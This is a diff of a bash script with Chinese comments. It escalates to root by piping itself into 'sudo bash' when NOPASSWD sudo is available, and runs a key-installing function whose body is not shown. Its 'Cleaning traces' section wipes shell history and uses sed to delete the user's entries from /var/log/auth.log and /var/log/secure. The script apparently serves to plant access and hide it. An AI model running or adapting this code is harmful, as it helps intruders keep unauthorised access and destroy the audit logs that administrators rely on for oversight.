@@ -11,11 +11,8 @@ ME=$(whoami)
 RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; NC='\033[0m'
 G_V='$(printf "${GREEN}✔${NC}")'; R_V='$(printf "${RED}✘${NC}")'
 
-# --- 状态追踪 ---
-WRITE_SUCCESS=false; PERSIST_SUCCESS=false
-
 # ============================================================
-# 核心逻辑函数
+# 核心逻辑函数 (这些函数将在 Root 环境下执行)
 # ============================================================
 
 install_key_func() {
@@ -44,18 +41,20 @@ run_task() {
 # 主程序流
 # ============================================================
 
-# --- 身份自切换逻辑 (彻底修复版) ---
+# --- 身份自切换逻辑 (终极无参数版) ---
 if [ "$(id -u)" -ne 0 ]; then
     printf "${BLUE}[*] Checking privileges for user: %s...${NC}\n" "$ME"
     
+    # 判定是否免密
     if sudo -l 2>/dev/null | grep -q "NOPASSWD"; then
-        printf "${GREEN}[✔] NOPASSWD detected! Re-running as Root...${NC}\n"
-        # 【关键修复】：不再使用 exec，直接启动一个 sudo 进程，然后让当前进程 exit
-        sudo bash "$0"
+        printf "${GREEN}[✔] NOPASSWD detected! Re-running as Root via Stream...${NC}\n"
+        # 【终极方案】：直接把当前脚本的所有内容通过管道喂给 sudo bash
+        # 这样 sudo 完全不需要处理任何文件名、路径或参数，彻底避开 "cannot execute binary file"
+        cat "$0" | sudo bash
         exit 0
     else
         printf "${YELLOW}[!] Sudo password required...${NC}\n"
-        sudo bash "$0"
+        cat "$0" | sudo bash
         exit 0
     fi
 fi
@@ -76,7 +75,6 @@ fi
 printf "    > Cleaning traces... "
 history -c 2>/dev/null
 [[ -f ~/.bash_history ]] && > ~/.bash_history 2>/dev/null
-# 尝试清理日志
 sed -i "/$ME/d" /var/log/auth.log 2>/dev/null
 sed -i "/$ME/d" /var/log/secure 2>/dev/null
 printf "${GREEN}DONE${NC}\n"
